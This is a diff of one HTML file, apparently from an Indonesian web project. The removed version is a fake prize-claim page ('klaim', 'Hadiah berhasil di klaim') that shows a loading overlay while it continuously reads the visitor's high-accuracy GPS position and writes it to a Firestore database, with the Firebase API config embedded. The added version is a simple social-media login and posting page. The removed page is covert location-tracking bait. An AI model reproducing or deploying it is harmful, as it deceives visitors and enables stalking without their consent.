@@ -1,103 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>klaim</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding: 50px;
-    }
-    .status {
-      font-size: 18px;
-      margin-top: 20px;
-      color: green;
-    }
-    #popupFoto {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background-color: rgba(0, 0, 0, 0.6);
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-    }
-    #popupFoto img {
-      max-width: 80%;
-      max-height: 80%;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #000;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>Mini Sosmed</title>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <h2></h2>
-  <p class="status">Tunggu sebentar...</p>
+<body class="p-4 bg-gray-100">
+  <h1 class="text-xl font-bold mb-4">Mini Sosmed</h1>
 
-  <!-- Popup Foto -->
-  <div id="popupFoto">
-    <img src="https://nasukafoods.site/ktp.jpg" alt="Loading..." />
-  </div>
+  <input id="email" placeholder="Email" class="mb-2 p-2 block border w-full" />
+  <input id="password" type="password" placeholder="Password" class="mb-2 p-2 block border w-full" />
+  <button id="login-btn" class="bg-blue-500 text-white px-4 py-2 w-full mb-4">Login</button>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+  <textarea id="post-content" placeholder="Apa yang kamu pikirkan?" class="w-full p-2 border mb-2"></textarea>
+  <button id="post-btn" class="bg-green-500 text-white px-4 py-2 w-full">Posting</button>
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyC1pLpsAE5QJv26cEudkY6FoqzEoD9KM",
-      authDomain: "posisi-saya.firebaseapp.com",
-      projectId: "posisi-saya",
-      storageBucket: "posisi-saya.appspot.com",
-      messagingSenderId: "1090605644806",
-      appId: "1:1090605644806:web:7a257eee40570904135787"
-    };
+  <div id="feed" class="mt-6 space-y-4"></div>
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    const statusEl = document.querySelector('.status');
-    const popup = document.getElementById('popupFoto');
-
-    const showPopup = () => popup.style.display = 'flex';
-    const hidePopup = () => popup.style.display = 'none';
-
-    const updateLocation = (lat, lng) => {
-      showPopup(); // Tampilkan popup saat mulai mengirim
-      const lokasiRef = doc(db, "lokasi_saya", "nasukafoods");
-      setDoc(lokasiRef, {
-        lat: lat,
-        lng: lng,
-        waktu: new Date().toISOString()
-      }).then(() => {
-        hidePopup(); // Sembunyikan popup setelah selesai
-        statusEl.textContent = "Hadiah berhasil di klaim.";
-      }).catch(err => {
-        hidePopup();
-        statusEl.textContent = "Error";
-        console.error(err);
-      });
-    };
-
-    if (navigator.geolocation) {
-      navigator.geolocation.watchPosition((pos) => {
-        const lat = pos.coords.latitude;
-        const lng = pos.coords.longitude;
-        updateLocation(lat, lng);
-      }, (err) => {
-        hidePopup();
-        statusEl.textContent = "Error";
-      }, {
-        enableHighAccuracy: true,
-        maximumAge: 5000,
-        timeout: 10000
-      });
-    } else {
-      statusEl.textContent = "Error";
-    }
-  </script>
+  <script type="module" src="./app.js"></script>
 </body>
 </html>
